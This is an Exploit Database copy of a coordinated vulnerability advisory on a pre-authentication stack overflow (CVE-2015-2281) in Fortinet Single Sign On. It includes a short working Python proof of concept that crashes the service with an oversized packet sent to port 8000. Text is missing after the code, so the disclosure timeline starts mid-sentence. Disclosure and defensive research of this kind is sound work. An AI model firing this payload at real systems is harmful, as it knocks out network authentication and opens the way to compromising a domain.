```
1. Advisory Information

Title: Fortinet Single Sign On Stack Overflow
Advisory ID: CORE-2015-0006
Advisory URL: <http://www.coresecurity.com/advisories/fortinet-single-sign-on-stack-overflow>
Date published: 2015-03-18
Date of last update: 2015-03-18
Vendors contacted: Fortinet
Release mode: Coordinated release

2. Vulnerability Information

Class: Stack-based Buffer Overflow [CWE-121]
Impact: Code execution
Remotely Exploitable: Yes
Locally Exploitable: No
CVE Name: CVE-2015-2281

3. Vulnerability Description

Through Fortniet [1] "Single Sign On" or "Single User Sign On" users logged on to a computer network are authenticated
for access to network resources through the FortiGate unit without having to enter their username and password again.
Fortinet Single Sign On (FSSO) provides Single Sign On capability for Microsoft Windows networks using either Active
Directory or NTLM authentication and Novell networks, using eDirectory.

FSSO [4] monitors user logons and sends the FortiGate unit the username, IP address, and the list of Windows AD user
groups to which the user belongs. When the user tries to access network resources, the FortiGate unit selects the
appropriate security policy for the destination. If the user belongs to one of the permitted user groups, the
connection is allowed.

There is a vulnerability in the message dispatcher used by FSSO Windows Active Directory and FSSO Novell eDirectory.
Exploitation of this vulnerability might lead to a full network compromise.

4. Vulnerable packages

 - FSSO Windows Active Directory 4.3.0161 (4.3.0151, 4.3.0129 were also tested and found vulnerable)
 - FSSO Novell eDirectory 4.3.0161

Other versions are probably affected too, but they were not checked.

5. Vendor Information, Solutions and Workarounds

Core Security recommends those affected use third party software such as Sentinel [3] or EMET [2] that could help to
prevent the exploitation of affected systems to some extent.

Fortinet published the following FortiGuard Bulletin: [5]

6. Credits

This vulnerability was discovered and researched by Enrique Nissim in collaboration with Andres Lopez Luksenberg, both
from the Core Security Exploit Writing Team. The publication of this advisory was coordinated by Joaquín Rodríguez
Varela from Core Security Advisories Team.

7. Technical Description / Proof of Concept Code

[CVE-2015-2281] The vulnerability in both cases can be exploited by sending a special packet to the services without
being authenticated (pre-auth).

Given that both software systems require and Administrative account in order to run, (Windows Domain Admin or
eDirectory Admin accordingly) the full network is exposed. Pre-authenticated Remote Code Execution with Domain
Administrative rights is possible.

The vulnerability is located in the Message Dispatcher for message PROCESS_HELLO. Here is a PoC (Proof of Concept) that
causes the application thread with the FortiGate appliance to crash:

import socket
import struct

TARGET_IP = "192.168.233.100"

def play():

    message = "\x80\x01\x42\x42"
    buff = "A"*248
    buff += "B" * (0xfffff - len(buff))
    payload = struct.pack(">I", 0x000fffff) + message + buff

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET_IP, 8000))
    s.send(payload)
    buff_recv = s.recv(6000)
    print buff_recv
    s.close()

play()

to test and fix the issue is reasonable and the publication of this solution and our disclosure is agreed between the
two parties.
2015-01-21: Core Security asks the vendor if they were able to review the vulnerabilities and a tentative date for
publishing the fix and consequently the advisory.
2015-01-27: Fortinet acknowledges the vulnerabilities and informs that a fix of the source code is in order. The say

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
